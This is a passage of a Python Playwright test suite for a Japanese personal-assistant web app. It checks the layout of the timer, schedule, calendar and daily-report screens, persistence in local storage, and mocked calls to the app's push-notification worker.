        self.assertNotEqual(style[2], "rgb(232, 196, 92)")  # 中は金で塗らない（金の塗りは「保存する」だけ）
        other = page.eval_on_selector("#report-form .mood[data-mood=tired]", "e => getComputedStyle(e).color")
        self.assertNotEqual(other, "rgb(232, 196, 92)")
        self.assertLessEqual(page.evaluate("document.documentElement.scrollWidth"), 393)

    def test_report_screen_one_gold_fill_and_inputs(self):
        page = self.report_page(size=(375, 667))
        fills = page.evaluate("""() => [...document.querySelectorAll('#view-report *')]
          .filter((e) => e.getClientRects().length && getComputedStyle(e).backgroundColor === 'rgb(232, 196, 92)')
          .map((e) => e.id || e.className)""")
        self.assertEqual(fills, ["report-save"])
        sizes = page.eval_on_selector_all("#view-report input, #view-report textarea", "els => els.map(e => parseFloat(getComputedStyle(e).fontSize))")
        self.assertTrue(all(sz >= 16 for sz in sizes), sizes)
        self.assertLessEqual(page.evaluate("document.documentElement.scrollWidth"), 375)
        page.wait_for_function("document.getElementById('report-history-empty').textContent.startsWith('キィニチ')", timeout=3_000)


    # ---------- タイマー画面（D-026 ③, D-028） ----------
    WORKER = "https://kiinichi-push.numwm.workers.dev"
    GOLD_FILLS = """() => [...document.querySelectorAll('#view-timer *')]
      .filter((e) => e.getClientRects().length && getComputedStyle(e).backgroundColor === 'rgb(232, 196, 92)')
      .map((e) => e.id || e.className)"""

    def timer_page(self, hour=10, minute=0, day=9, state=None, size=(393, 852)):
        """合言葉なし（送信サーバーは呼ばれない）でタイマー画面を開く。"""
        init = None
        if state is not None:
            init = "localStorage.setItem('db.timer', %s)" % json.dumps(json.dumps(state))
        page = self.clock_page(hour, minute, "#timer", day=day, init_script=init, size=size)
        page.wait_for_selector("#view-timer", state="visible", timeout=3_000)
        return page

    def fake_timer_worker(self, calls, status=200, body='{"ok":true}'):
        def handler(route):
            req = route.request
            cors = {"Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "Authorization, Content-Type",
                    "Access-Control-Allow-Methods": "GET, POST, OPTIONS"}
            if req.method == "OPTIONS":
                route.fulfill(status=204, headers=cors)
                return
            if req.method == "GET":  # 起動時の購読の確認（/api/status）。予約・取り消しの呼び出しには数えない
                route.fulfill(status=200, content_type="application/json", headers=cors, body='{"subscribed":true,"queue":[]}')
                return
            calls.append(req)
            route.fulfill(status=status, content_type="application/json", headers=cors, body=body)
        return handler

    def routed_timer_page(self, calls, status=200, body='{"ok":true}', **kw):
        """送信サーバーを偽物にしてからタイマー画面を開く（読み込み時の呼び出しも受けられるよう、開く前に差し替える）。"""
        init = "localStorage.setItem('phase0.appToken', 'tok-123');"
        if not kw.get("voice"):  # タイマーの呼び出しだけを数えるため、声掛けの予約（D-049）は止める
            init += "if (!localStorage.getItem('db.prefs')) localStorage.setItem('db.prefs', JSON.stringify({ voice: false }));"
        if kw.get("state") is not None:
            init += "localStorage.setItem('db.timer', %s);" % json.dumps(json.dumps(kw["state"]))
        ctx = self.browser.new_context(permissions=["notifications"], viewport={"width": 393, "height": 852})
        self.addCleanup(ctx.close)
        ctx.add_init_script(READY)
        ctx.add_init_script(VISIBILITY)
        ctx.add_init_script(init)
        if kw.get("fake_push"):
            ctx.add_init_script(FAKE_PUSH)
        ctx.route(self.WORKER + "/**", kw.get("handler") or self.fake_timer_worker(calls, status, body))
        page = ctx.new_page()
        errors = []
        page.on("pageerror", lambda e: errors.append(str(e)))
        self.addCleanup(lambda: self.assertEqual(errors, [], "JSエラーが出ている"))
        page.clock.install(time=datetime(2026, 11, 9, kw.get("hour", 10), kw.get("minute", 0), 0))
        page.goto(self.base + "index.html?mode=standalone#timer")
        page.wait_for_function("dialogue !== null", timeout=3_000)
        return page

    def wait_calls(self, page, calls, n):
        deadline = 50
        while len(calls) < n and deadline:
            page.wait_for_timeout(100)
            deadline -= 1
        self.assertGreaterEqual(len(calls), n)

    def timer_state(self, page):
        return json.loads(page.evaluate("localStorage.getItem('db.timer')"))

    def test_timer_lists_builtin_timers(self):
        page = self.timer_page()
        rows = page.eval_on_selector_all("#timer-list li", "els => els.map(e => e.textContent)")
        self.assertEqual(rows, ["作業25分▶", "休憩5分▶", "入浴20分▶", "歯磨き3分▶"])
        self.assertEqual(page.query_selector_all("#timer-list .task-del"), [])  # 用途別のタイマーは消せない
        self.assertTrue(page.is_hidden("#timer-running"))
        self.assertTrue(page.is_hidden("#timer-done"))

    def test_timer_start_counts_down_and_survives_reload(self):
        page = self.timer_page()
        page.click("#timer-list li[data-id=work] .task-main")
        self.assertTrue(page.is_visible("#timer-running"))
        self.assertTrue(page.is_hidden("#timer-idle"))
        self.assertEqual(page.text_content("#timer-name"), "作業（25分）")
        self.assertEqual(page.text_content("#timer-rest"), "25:00")
        self.assertEqual(page.text_content("#timer-end"), "10:25 に終わる")
        page.clock.run_for(61_000)
        self.assertEqual(page.text_content("#timer-rest"), "23:59")
        end_at = self.timer_state(page)["running"]["endAt"]
        page.reload()  # 終了時刻を保存しているので、開き直しても残り時間は正しい
        page.wait_for_selector("#timer-running", state="visible")
        self.assertEqual(self.timer_state(page)["running"]["endAt"], end_at)
        self.assertRegex(page.text_content("#timer-rest"), r"^23:5\d$")

    def test_timer_finishes_with_character_line_and_close(self):
        page = self.timer_page()
        page.click("#timer-list li[data-id=brush] .task-main")
        page.clock.run_for(3 * 60_000 + 500)
        self.assertTrue(page.is_visible("#timer-done"))
        self.assertTrue(page.is_hidden("#timer-running"))
        self.assertEqual(page.text_content("#timer-done-title"), "歯磨き（3分）が終わった")
        self.assertEqual(page.text_content("#timer-done-at"), "10:03 に終了")
        self.assertEqual(page.text_content("#timer-done-line"), "時間だ。口をゆすげ。")
        page.click("#timer-close")
        self.assertTrue(page.is_visible("#timer-idle"))
        self.assertIsNone(self.timer_state(page)["done"])

    def test_timer_finished_while_closed_shows_done_on_open(self):
        # 10:00 に開く。9:57 に終わっていたタイマーは「終了」として出る
        end = int(datetime(2026, 11, 9, 9, 57, 0).timestamp() * 1000)
        state = {"custom": [], "running": {"name": "入浴", "minutes": 20, "kind": "bath", "endAt": end,
                                           "line": 0, "text": "上がる時間だ。のぼせる前に出ろ。水分、忘れるな。", "notify": "ok"}}
        page = self.timer_page(state=state)
        self.assertTrue(page.is_visible("#timer-done"))
        self.assertEqual(page.text_content("#timer-done-title"), "入浴（20分）が終わった")
        self.assertEqual(page.text_content("#timer-done-at"), "09:57 に終了")

    def test_timer_quick_start_validates_minutes(self):
        page = self.timer_page()
        page.click("#timer-quick-start")
        self.assertIn("1〜600分", page.text_content("#timer-quick-status"))
        self.assertTrue(page.is_visible("#timer-idle"))
        for bad in ("0", "601", "2.5"):
            page.fill("#timer-quick-min", bad)
            page.click("#timer-quick-start")
            self.assertTrue(page.is_visible("#timer-idle"), bad)
        page.fill("#timer-quick-min", "90")
        page.click("#timer-quick-start")
        self.assertEqual(page.text_content("#timer-name"), "タイマー（90分）")
        self.assertEqual(page.text_content("#timer-rest"), "1:30:00")
        page.click("#timer-stop")
        self.assertTrue(page.is_visible("#timer-idle"))
        self.assertIsNone(self.timer_state(page)["running"])

    def test_timer_custom_create_persist_start_delete_undo(self):
        page = self.timer_page()
        page.click("#timer-new-open")
        self.assertTrue(page.is_hidden("#timer-quick"))
        page.click("#timer-new-save")
        self.assertIn("名前", page.text_content("#timer-form-status"))
        page.fill("#timer-new-name", "ストレッチ")
        page.click("#timer-new-save")
        self.assertIn("1〜600分", page.text_content("#timer-form-status"))
        page.fill("#timer-new-min", "10")
        page.click("#timer-new-save")
        self.assertTrue(page.is_hidden("#timer-form"))
        self.assertTrue(page.is_visible("#timer-quick"))
        rows = page.eval_on_selector_all("#timer-list li", "els => els.map(e => e.textContent)")
        self.assertEqual(rows[-1], "ストレッチ10分▶")
        page.reload()
        page.wait_for_selector("#view-timer", state="visible")
        rows = page.eval_on_selector_all("#timer-list li", "els => els.map(e => e.textContent)")
        self.assertEqual(len(rows), 5)
        page.click("#timer-list li:last-child .task-main")
        self.assertEqual(page.text_content("#timer-name"), "ストレッチ（10分）")
        page.click("#timer-stop")
        page.click("#timer-list li:last-child .task-del")
        self.assertEqual(page.text_content("#confirm-text"), "「ストレッチ」を削除しますか？")
        page.keyboard.press("Escape")  # Esc は「やめる」と同じ
        self.assertEqual(len(page.query_selector_all("#timer-list li")), 5)
        page.click("#timer-list li:last-child .task-del")
        page.click("#confirm-ok")
        page.wait_for_selector("#timer-toast", state="visible", timeout=3_000)  # 確認の結果は非同期で届く
        self.assertEqual(len(page.query_selector_all("#timer-list li")), 4)
        self.assertIn("削除しました", page.text_content("#timer-toast"))
        page.click("#timer-toast .undo")
        self.assertEqual(len(page.query_selector_all("#timer-list li")), 5)
        page.click("#timer-list li:last-child .task-del")
        page.click("#confirm-ok")
        page.wait_for_selector("#timer-toast", state="visible", timeout=3_000)  # 確認の結果は非同期で届く
        page.clock.run_for(5_100)
        self.assertTrue(page.is_hidden("#timer-toast"))
        self.assertEqual(self.timer_state(page)["custom"], [])

    def test_timer_reserves_notification_and_cancels_on_stop(self):
        calls = []
        page = self.routed_timer_page(calls)
        page.click("#timer-list li[data-id=work] .task-main")
        self.wait_calls(page, calls, 1)
        req = calls[0]
        self.assertEqual(req.url, self.WORKER + "/api/schedule")
        self.assertEqual(req.headers["authorization"], "Bearer tok-123")
        body = json.loads(req.post_data)
        self.assertEqual(body["key"], "timer")
        self.assertEqual(body["at"], self.timer_state(page)["running"]["endAt"])
        self.assertIs(body["notBefore"], True)  # 終わる前には届けない
        self.assertEqual(body["title"], "キィニチ")
        self.assertEqual(body["body"], "時間だ。……よくやった。手を止めろ。")
        self.assertTrue(body["url"].endswith("/index.html?source=webpush&trigger=timer_done.work&line=0&h=%s#timer" % page.evaluate("lineHash('時間だ。……よくやった。手を止めろ。')")), body["url"])
        page.wait_for_selector("#timer-notify.ok", timeout=3_000)
        self.assertIn("通知で知らせます", page.text_content("#timer-notify"))
        page.click("#timer-stop")
        self.wait_calls(page, calls, 2)
        self.assertEqual(calls[1].url, self.WORKER + "/api/cancel")
        self.assertEqual(json.loads(calls[1].post_data), {"key": "timer"})

    def test_timer_cancels_reservation_when_finished_on_screen(self):
        # 画面を見ている間に終わったら、同じ知らせが後から届かないよう予約を取り消す
        calls = []
        page = self.routed_timer_page(calls)
        page.click("#timer-list li[data-id=brush] .task-main")
        self.wait_calls(page, calls, 1)
        page.clock.run_for(3 * 60_000 + 500)
        self.wait_calls(page, calls, 2)
        self.assertEqual([c.url.rsplit("/", 1)[1] for c in calls], ["schedule", "cancel"])
        self.assertTrue(page.is_visible("#timer-done"))

    def test_timer_keeps_reservation_when_finished_in_background(self):
        # 裏に回っている間に終わったら予約は残す（通知で知らせる）。画面に戻ったら取り消す
        calls = []
        page = self.routed_timer_page(calls)
        page.click("#timer-list li[data-id=brush] .task-main")
        self.wait_calls(page, calls, 1)
        page.evaluate("window.__vis = 'hidden'; document.dispatchEvent(new Event('visibilitychange'))")
        page.clock.run_for(3 * 60_000 + 500)
        page.wait_for_timeout(300)
        self.assertEqual(len(calls), 1)
        page.evaluate("window.__vis = 'visible'; document.dispatchEvent(new Event('visibilitychange'))")
        self.wait_calls(page, calls, 2)
        self.assertTrue(calls[1].url.endswith("/api/cancel"))
        self.assertTrue(page.is_visible("#timer-done"))

    def test_timer_notification_tap_fallback_opens_timer_view(self):
        # 通知のタップで画面の移動に失敗したとき（sw.js の open-url）も、タイマー画面を開く
        end = int(datetime(2026, 11, 9, 12, 40, 0).timestamp() * 1000)
        state = {"custom": [], "running": {"name": "休憩", "minutes": 5, "kind": "break", "endAt": end,
                                           "line": 0, "text": "休憩は終わりだ。戻るかどうかは任せる。", "notify": "ok"}}
        init = "localStorage.setItem('db.timer', %s)" % json.dumps(json.dumps(state))
        page = self.clock_page(12, 41, init_script=init)
        self.assertTrue(page.is_visible("#view-home"))
        page.evaluate("""navigator.serviceWorker.dispatchEvent(new MessageEvent('message', { data: {
          type: 'open-url', url: location.origin + '/index.html?source=webpush&trigger=timer_done.break&line=0#timer' } }))""")
        page.wait_for_selector("#timer-done", state="visible", timeout=3_000)
        self.assertEqual(page.text_content("#timer-done-line"), "休憩は終わりだ。戻るかどうかは任せる。")
        self.assertEqual(page.text_content("#bubble-text"), "休憩は終わりだ。戻るかどうかは任せる。")  # ホームのセリフも同じ

    def test_timer_shows_reason_when_reservation_fails(self):
        # 合言葉がない：送信サーバーは呼ばず、画面内の表示だけになることを伝える
        page = self.timer_page()
        page.click("#timer-list li[data-id=work] .task-main")
        page.wait_for_selector("#timer-notify.ng", timeout=3_000)
        self.assertIn("通知を予約できませんでした（合言葉を入力してください）", page.text_content("#timer-notify"))
        self.assertEqual(page.text_content("#timer-rest"), "25:00")  # タイマー自体は動く
        # 送信サーバーが古い版（/api/schedule がない）
        calls = []
        page = self.routed_timer_page(calls, status=404, body='{"error":"Not found"}')
        page.click("#timer-list li[data-id=work] .task-main")
        page.wait_for_selector("#timer-notify.ng", timeout=3_000)
        self.assertIn("送信サーバーの更新が必要です", page.text_content("#timer-notify"))

    def test_timer_screen_gold_fill_touch_sizes_and_width(self):
        state = {"custom": [{"id": "x", "name": "とても長い名前のタイマーをここに入れておく三十字", "minutes": 600}]}
        page = self.timer_page(state=state, size=(375, 667))
        self.assertEqual(page.evaluate(self.GOLD_FILLS), ["timer-quick-start"])
        heights = page.eval_on_selector_all("#timer-list .task-main", "els => els.map(e => e.getBoundingClientRect().height)")
        self.assertTrue(all(h >= 52 for h in heights), heights)
        self.assertGreaterEqual(page.eval_on_selector("#timer-list .task-del", "e => e.getBoundingClientRect().width"), 44)
        self.assertLessEqual(page.evaluate("document.documentElement.scrollWidth"), 375)
        page.click("#timer-new-open")
        self.assertEqual(page.evaluate(self.GOLD_FILLS), ["timer-new-save"])
        sizes = page.eval_on_selector_all("#view-timer input", "els => els.map(e => parseFloat(getComputedStyle(e).fontSize))")
        self.assertTrue(all(sz >= 16 for sz in sizes), sizes)
        r = page.evaluate("""() => { const b = document.getElementById('timer-new-save').getBoundingClientRect();
          const tb = document.querySelector('.tabbar').getBoundingClientRect(); return [b.bottom, tb.top]; }""")
        self.assertLessEqual(r[0], r[1])  # 保存ボタンが下のタブに隠れない
        page.click("#timer-new-cancel")
        page.click("#timer-list li[data-id=work] .task-main")
        self.assertEqual(page.evaluate(self.GOLD_FILLS), [])  # 動いている間は金の塗りなし
        self.assertEqual(page.eval_on_selector("#timer-rest", "e => getComputedStyle(e).fontVariantNumeric"), "tabular-nums")
        self.assertLessEqual(page.evaluate("document.documentElement.scrollWidth"), 375)
        page.clock.run_for(25 * 60_000 + 500)
        self.assertEqual(page.evaluate(self.GOLD_FILLS), ["timer-close"])

    # ---------- 予定画面（D-026 ④, D-030, D-032） ----------
    def schedule_page(self, hour=10, minute=0, day=9, size=(393, 852), mode=None):
        init = "localStorage.setItem('schedule.view', '%s')" % mode if mode else None
        page = self.clock_page(hour, minute, "#schedule", day=day, size=size, init_script=init)
        page.wait_for_selector("#view-schedule", state="visible", timeout=3_000)
        return page

    ROWS = """els => els.map(e => [
      e.querySelector('.schedule-time').textContent, e.querySelector('.schedule-title').textContent,
      e.classList.contains('past'), e.classList.contains('next'),
      e.querySelector('.schedule-rest') ? e.querySelector('.schedule-rest').textContent : null])"""

    def schedule_rows(self, page, date):
        return page.eval_on_selector_all(f"#schedule-days .schedule-day[data-date='{date}'] .schedule-row", self.ROWS)

    def test_schedule_routine_rows_are_quieter_than_events(self):
        """毎日の時刻の行は細く小さく一段弱い色、カレンダーの予定は太く大きく。名前の頭はそろい、行の高さは変えない（D-064 ②、CR-G06）"""
        page = self.schedule_page()
        rows = page.eval_on_selector_all("#schedule-days .schedule-day[data-date='2026-11-14'] .schedule-row", """els => els.map(e => {
          const t = getComputedStyle(e.querySelector('.schedule-time'));
          return [e.querySelector('.schedule-title').firstChild.textContent, e.classList.contains('routine-row-item'), t.fontWeight, parseFloat(t.fontSize), t.color,
            Math.round(e.querySelector('.schedule-title').getBoundingClientRect().left), e.getBoundingClientRect().height]; })""")
        by = {r[0]: r for r in rows}
        routine, event, allday = by["朝食"], by["買い出し"], by["部屋の片づけ"]
        self.assertTrue(routine[1])
        self.assertFalse(event[1])
        self.assertEqual(routine[2], "400")
        self.assertEqual(event[2], "700")
        self.assertLess(routine[3], event[3])
        self.assertNotEqual(routine[4], event[4])  # 色も変える（太さ・大きさだけに頼らない）
        self.assertEqual({r[5] for r in rows}, {routine[5]})  # 名前の頭がそろう（終日の行も）
        self.assertGreaterEqual(min(r[6] for r in rows), 52)  # 行の高さは変えない（詰めない）
        self.assertIsNotNone(allday)

    def test_status_bar_band_on_scrolling_screens_only(self):
        """ホーム以外は、上のセーフエリアに地の上端の色の帯を固定し、スクロールした中身を時計・電池の表示の下に通さない。ホームには出さない（D-064 ③、CR-B04）"""
        page = self.clock_page(10, 0, size=(393, 852), safe=(59, 34))
        band = "() => { const s = getComputedStyle(document.body, '::before'); return [s.content, s.position, s.height, s.backgroundColor, s.zIndex]; }"
        self.assertEqual(page.evaluate(band)[0], "none")  # ホームは変えない
        top = page.evaluate("getComputedStyle(document.documentElement).getPropertyValue('--color-bg-top').trim()")
        for view in ("schedule", "tasks", "timer", "report", "settings", "system"):
            page.evaluate(f"location.hash = '#{view}'")
            page.wait_for_selector(f"#view-{view}", state="visible")
            content, position, height, bg, z = page.evaluate(band)
            self.assertEqual((content, position, height), ('""', "fixed", "59px"), view)
            self.assertEqual(bg, page.evaluate("(c) => { const d = document.createElement('i'); d.style.color = c; document.body.append(d); const v = getComputedStyle(d).color; d.remove(); return v; }", top), view)
            self.assertGreater(int(z), 1, view)  # 予定の貼り付く日付の見出し（z-index 1）より手前

    def test_schedule_list_shows_eight_days_with_day_headers(self):
        page = self.schedule_page()
        self.assertTrue(page.is_visible("#schedule-list-view"))
        self.assertTrue(page.is_hidden("#schedule-month-view"))
        titles = page.eval_on_selector_all("#schedule-days .schedule-day-title", "els => els.map(e => e.textContent)")
        self.assertEqual(titles, ["今日 11月9日(月)", "明日 11月10日(火)", "11月11日(水)", "11月12日(木)",
                                  "11月13日(金)", "11月14日(土)", "11月15日(日)", "11月16日(月)"])  # 今日から7日先まで
        today = self.schedule_rows(page, "2026-11-09")
        self.assertEqual(len(today), 8)
        self.assertEqual(today[0], ["07:00", "起床", True, False, None])
        self.assertEqual(today[1], ["07:30", "朝食", True, False, None])  # 生活の時刻は設定の「毎日の時刻」（D-048）
        self.assertEqual(today[3], ["12:00", "昼食", False, True, "次 ・ あと2時間"])
        self.assertEqual(len(page.query_selector_all("#schedule-days .schedule-row.next")), 1)
        self.assertEqual(len(page.query_selector_all("#schedule-days .schedule-day:not([data-date='2026-11-09']) .schedule-row.past")), 0)
        # 予定のある日：終日が先、あとは時刻順に生活の時刻と混ざる
        sat = [r[:2] for r in self.schedule_rows(page, "2026-11-14")]
        self.assertEqual(sat[0], ["終日", "部屋の片づけ"])
        self.assertEqual(sat[2:4], [["07:30", "朝食"], ["10:00", "買い出し"]])
        self.assertNotIn("仕事開始", [r[1] for r in sat])  # 休日（土日）は仕事の時刻なし
        self.assertIn(["19:00", "友人と夕食"], sat)
        self.assertIn("仮", page.text_content("#view-schedule h1"))
        # 日付の見出しは帯にして、スクロール中も上に残す
        style = page.eval_on_selector(".schedule-day-title", "e => [getComputedStyle(e).position, getComputedStyle(e).backgroundColor]")
        self.assertEqual(style[0], "sticky")
        self.assertNotIn(style[1], ("rgba(0, 0, 0, 0)", "transparent"))
        # ホームの「次の予定」と同じ予定を指している
        page.evaluate("location.hash = '#home'")
        self.assertIn("昼食", page.text_content("#next-event"))

    def test_schedule_next_moves_as_time_passes(self):
        page = self.schedule_page(hour=11, minute=59)
        self.assertEqual(self.schedule_rows(page, "2026-11-09")[3][4], "次 ・ あと1分")
        page.clock.run_for(62_000)  # 12:00 を過ぎる
        today = self.schedule_rows(page, "2026-11-09")
        self.assertEqual(today[3][2:], [True, False, None])
        self.assertEqual(today[4], ["18:30", "仕事終わり", False, True, "次 ・ あと6時間30分"])

    def test_schedule_after_last_event_marks_tomorrow_first(self):
        page = self.schedule_page(hour=23, minute=45)
        self.assertTrue(all(r[2] for r in self.schedule_rows(page, "2026-11-09")))
        self.assertEqual(self.schedule_rows(page, "2026-11-10")[0], ["07:00", "起床", False, True, "次 ・ あと7時間15分"])

    def test_schedule_day_without_events_and_all_empty(self):
        page = self.schedule_page()
        # 1日だけ予定がない：見出しは残り「予定なし」と出る
        page.evaluate("""() => { const orig = SampleData.eventsOn;
          SampleData.eventsOn = (d) => d.getDate() === 11 ? [] : orig(d); Schedule.refresh(); }""")
        self.assertEqual(page.text_content("#schedule-days .schedule-day[data-date='2026-11-11'] .schedule-row"), "予定なし")
        self.assertEqual(len(page.query_selector_all("#schedule-days .schedule-day")), 8)
        self.assertEqual(page.text_content("#schedule-say-line"), "今日は何も入っていない。先の分だけ見ておけ。")
        # 8日とも予定がない：空のときの一言（同じ面に出す）
        page.evaluate("SampleData.eventsOn = () => []; Schedule.refresh()")
        page.wait_for_function("document.getElementById('schedule-say-line').textContent === '予定は入っていない。好きに使えばいい。'", timeout=3_000)
        self.assertTrue(page.is_visible("#schedule-say"))
        self.assertEqual(len(page.query_selector_all("#schedule-days .schedule-row.none")), 8)

    def cal_cell(self, page, date):
        return page.eval_on_selector(f"#cal-grid .cal-cell[data-date='{date}']", """e => ({
          date: e.querySelector('.cal-date').textContent, tags: [...e.querySelectorAll('.cal-tag')].map(t => t.textContent),
          more: e.querySelector('.cal-more') ? e.querySelector('.cal-more').textContent : null,
          out: e.classList.contains('out'), today: e.classList.contains('today'),
          pressed: e.getAttribute('aria-pressed'), label: e.getAttribute('aria-label') })""")

    def test_schedule_switch_to_month_and_remember(self):
        page = self.schedule_page()
        self.assertEqual(page.get_attribute("#schedule-mode-list", "aria-pressed"), "true")
        page.click("#schedule-mode-month")
        self.assertTrue(page.is_visible("#schedule-month-view"))
        self.assertTrue(page.is_hidden("#schedule-list-view"))
        self.assertEqual(page.get_attribute("#schedule-mode-month", "aria-pressed"), "true")
        self.assertEqual(page.get_attribute("#schedule-mode-list", "aria-pressed"), "false")
        page.reload()  # 選んだ表示を覚えている
        page.wait_for_selector("#schedule-month-view", state="visible", timeout=3_000)
        page.click("#schedule-mode-list")
        self.assertTrue(page.is_visible("#schedule-list-view"))
        self.assertEqual(page.evaluate("localStorage.getItem('schedule.view')"), "list")

    def test_month_grid_dates_tags_and_today(self):
        page = self.schedule_page(mode="month")
        self.assertEqual(page.text_content("#cal-title"), "2026年11月")
        dates = page.eval_on_selector_all("#cal-grid .cal-cell", "els => els.map(e => e.dataset.date)")
        self.assertEqual(len(dates), 35)  # 2026年11月は日曜はじまりで5週
        self.assertEqual([dates[0], dates[-1]], ["2026-11-01", "2026-12-05"])
        self.assertEqual(page.text_content(".cal-week"), "日月火水木金土")
        today = self.cal_cell(page, "2026-11-09")
        self.assertEqual([today["today"], today["pressed"], today["tags"]], [True, "true", []])  # 生活の時刻はタグにしない
        self.assertTrue(today["label"].startswith("今日 11月9日(月)"))
        self.assertEqual(len(page.query_selector_all("#cal-grid .cal-cell.today")), 1)
        sat = self.cal_cell(page, "2026-11-14")
        self.assertEqual([sat["date"], sat["tags"], sat["more"]], ["14", ["部屋の片づけ", "買い出し"], "+1"])
        self.assertEqual(sat["label"], "11月14日(土) 予定3件")
        self.assertEqual(self.cal_cell(page, "2026-11-20")["tags"], ["旅行"])
        self.assertEqual(self.cal_cell(page, "2026-11-21")["tags"], ["旅行"])  # 続く予定は日ごとにタグを出す
        dec = self.cal_cell(page, "2026-12-03")
        self.assertEqual([dec["out"], dec["tags"]], [True, ["読書会"]])
        # 今日には予定がないので、下は「予定なし」
        self.assertEqual(page.text_content("#cal-day-title"), "11月9日(月)")
        self.assertEqual(page.text_content("#cal-day-list"), "予定なし")

    def test_month_tap_day_shows_that_days_events(self):
        page = self.schedule_page(mode="month")
        page.click("#cal-grid .cal-cell[data-date='2026-11-14']")
        self.assertEqual(self.cal_cell(page, "2026-11-14")["pressed"], "true")
        self.assertEqual(self.cal_cell(page, "2026-11-09")["pressed"], "false")
        self.assertEqual(page.text_content("#cal-day-title"), "11月14日(土)")
        rows = [r[:2] for r in page.eval_on_selector_all("#cal-day-list .schedule-row", self.ROWS)]
        self.assertEqual(rows, [["終日", "部屋の片づけ"], ["10:00", "買い出し"], ["19:00", "友人と夕食"]])
        # 月の外の日を押すと、その月に移る
        page.click("#cal-grid .cal-cell[data-date='2026-12-03']")
        self.assertEqual(page.text_content("#cal-title"), "2026年12月")
        self.assertEqual(page.text_content("#cal-day-title"), "12月3日(木)")

    def test_month_prev_next_and_today(self):
        page = self.schedule_page(mode="month")
        page.click("#cal-next")
        self.assertEqual(page.text_content("#cal-title"), "2026年12月")
        self.assertEqual(page.text_content("#cal-day-title"), "12月1日(火)")
        self.assertEqual(len(page.query_selector_all("#cal-grid .cal-cell.today")), 0)
        page.click("#cal-next")
        self.assertEqual(page.text_content("#cal-title"), "2027年1月")  # 年をまたぐ
        self.assertEqual(len(page.query_selector_all("#cal-grid .cal-cell")), 42)  # 2027年1月は金曜はじまりで6週
        page.click("#cal-today")
        self.assertEqual(page.text_content("#cal-title"), "2026年11月")
        self.assertEqual(self.cal_cell(page, "2026-11-09")["pressed"], "true")
        page.click("#cal-prev")
        self.assertEqual(page.text_content("#cal-title"), "2026年10月")

    def test_schedule_screen_no_gold_fill_sizes_and_width(self):
        gold = """() => [...document.querySelectorAll('#view-schedule *')]
          .filter((e) => e.getClientRects().length && getComputedStyle(e).backgroundColor === 'rgb(232, 196, 92)')
          .map((e) => e.id || e.className)"""
        page = self.schedule_page(size=(375, 667))
        self.assertEqual(page.evaluate(gold), [])  # 見るだけの画面なので金の塗りはない
        heights = page.eval_on_selector_all("#schedule-days .schedule-row", "els => els.map(e => e.getBoundingClientRect().height)")
        self.assertTrue(all(h >= 52 for h in heights), heights)
        self.assertLessEqual(page.evaluate("document.documentElement.scrollWidth"), 375)
        self.assertEqual(page.eval_on_selector(".schedule-time", "e => getComputedStyle(e).fontVariantNumeric"), "tabular-nums")
        self.assertGreaterEqual(page.eval_on_selector("#schedule-mode-month", "e => e.getBoundingClientRect().height"), 44)
        page.click("#schedule-mode-month")
        self.assertEqual(page.evaluate(gold), [])
        self.assertLessEqual(page.evaluate("document.documentElement.scrollWidth"), 375)
        boxes = page.eval_on_selector_all("#cal-grid .cal-cell", "els => els.map(e => { const r = e.getBoundingClientRect(); return [r.width, r.height]; })")
        self.assertTrue(all(w >= 44 and h >= 44 for w, h in boxes), boxes[:3])  # マスは押せる大きさ
        self.assertEqual(len({round(w) for w, _ in boxes}), 1)  # 7列が同じ幅（長いタグで広がらない）
        for sel in ("#cal-prev", "#cal-next", "#cal-today"):
            r = page.eval_on_selector(sel, "e => { const r = e.getBoundingClientRect(); return [r.width, r.height]; }")
            self.assertTrue(r[0] >= 44 and r[1] >= 44, (sel, r))

    # ---------- レビューで見つけた点の修正（D-033, D-034） ----------
    CORS = {"Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "Authorization, Content-Type",
            "Access-Control-Allow-Methods": "GET, POST, OPTIONS"}

    def worker_handler(self, calls, respond):
        """respond(path, method) が (status, body) を返す。None なら通信の失敗。"""
        def handler(route):
            req = route.request
            if req.method == "OPTIONS":
                route.fulfill(status=204, headers=self.CORS)
                return
            path = req.url.split("/api/", 1)[1]
            calls.append(path)
            r = respond(path, req.method)
            if r is None:
                route.abort()
            else:
                route.fulfill(status=r[0], content_type="application/json", headers=self.CORS, body=json.dumps(r[1]))
        return handler

    def test_tasks_due_today_lasts_until_4am(self):
        tasks = [{"id": "a", "title": "昨日の暦で今日まで", "due": "2026-11-09", "done": False, "createdAt": 1}]
        page = self.tasks_page(hour=1, minute=30, day=10, tasks=tasks)
        self.assertIn("今日まで", page.text_content("#task-list li[data-id=a]"))
        page.click(ADD_NONE)
        page.click("#task-form .chip[data-due=today]")
        self.assertEqual(page.input_value("#task-due"), "2026-11-09")
        page = self.tasks_page(hour=4, minute=0, day=10, tasks=tasks)
        self.assertIn("期限切れ", page.text_content("#task-list li[data-id=a]"))

    def test_report_draft_survives_reload(self):
        page = self.report_page()
        page.fill("#report-done", "書いている途中")
        page.click("#report-form .mood[data-mood=tired]")
        page.reload()  # iPhone が裏でアプリを終了したのと同じ
        page.wait_for_function("dialogue !== null")
        self.assertEqual(page.input_value("#report-done"), "書いている途中")
        self.assertEqual(page.get_attribute("#report-form .mood[data-mood=tired]", "aria-pressed"), "true")
        self.assertIn("書きかけ", page.text_content("#report-status"))
        self.assertIsNone(page.evaluate("localStorage.getItem('db.reports')"))  # まだ日報としては保存していない
        page.click("#report-save")
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.reports')"))["2026-11-09"]["done"], "書いている途中")
        self.assertIsNone(page.evaluate("localStorage.getItem('db.reportDraft')"))
        page.reload()
        page.wait_for_function("dialogue !== null")
        self.assertIn("保存済み", page.text_content("#report-status"))

    def test_report_saves_under_shown_date_across_4am(self):
        page = self.report_page(hour=3, minute=50, day=10)
        self.assertEqual(page.text_content("#report-date"), "11月9日(月)の日報")
        page.fill("#report-done", "深夜に書いた")
        page.clock.fast_forward(15 * 60_000)  # 4:05。画面は開いたまま
        page.click("#report-save")
        self.assertEqual(list(json.loads(page.evaluate("localStorage.getItem('db.reports')"))), ["2026-11-09"])

    def test_report_old_draft_is_kept_as_that_days_report(self):
        page = self.report_page(hour=3, minute=50, day=10)
        page.fill("#report-done", "保存し忘れ")
        self.hide_and_return(page, 15 * 60_000)  # 4:05 に戻る
        self.assertEqual(page.text_content("#report-date"), "11月10日(火)の日報")
        self.assertEqual(page.input_value("#report-done"), "")
